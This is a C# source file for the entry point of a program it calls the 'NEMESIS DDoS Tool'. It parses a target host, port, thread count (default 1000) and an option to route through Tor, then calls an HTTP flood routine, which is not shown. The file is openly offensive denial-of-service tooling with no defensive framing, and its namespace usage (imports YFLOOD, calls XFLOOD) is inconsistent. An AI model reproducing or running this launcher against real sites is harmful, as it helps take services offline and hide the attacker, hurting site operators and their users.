using System;
using YFLOOD;
using Appature;
using Appature.Common;
namespace NEMESIS
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			string host = String.Empty;
			int port = 80;
			int threads = 1000;
			bool usetor = false;
			bool showHelp = false;
			var parser = new CommandParser("NEMESIS DDoS Tool");
			parser.Argument("T", "usetor", "Use TOR", (p, v) => {usetor = true;});
			parser.Argument("h", "host", "Specify a host without http://", "host",CommandArgumentFlags.TakesParameter |CommandArgumentFlags.Required,(p, v) => {host = v;});
			parser.Argument("p", "port", "Specify webserver port", "port",CommandArgumentFlags.TakesParameter |CommandArgumentFlags.Required,(p, v) => {port = Convert.ToInt32(v);});
			parser.Argument("t", "threads", "Specify number of threads", "threads",CommandArgumentFlags.TakesParameter |CommandArgumentFlags.Required,(p, v) => {threads = Convert.ToInt32(v);});
			parser.Argument("?", "help", "Shows the help screen.",CommandArgumentFlags.HideInUsage,(p, v) => {showHelp = true;});
			//This fragment was copied from CommanParser's example ParserHarness, I hope, that I not broke copyright ;)
			parser.Parse();

			if (parser.UnknownCommands.Count > 0) {
				foreach (var unknown in parser.UnknownCommands) {
					Console.WriteLine("Invalid command: " + unknown);
				}

				Console.WriteLine(parser.GetHelp());
			} else if (parser.MissingRequiredCommands.Count > 0) {
				foreach (var missing in parser.MissingRequiredCommands) {
					Console.WriteLine("ERROR: Missing argument: " + missing);
				}

				Console.WriteLine(parser.GetHelp());
			} else if (!showHelp) {
				XFLOOD.HTTPFlood (host, port, usetor, threads);
			} else {
				Console.WriteLine(parser.GetHelp());
			}
		}
	}
}
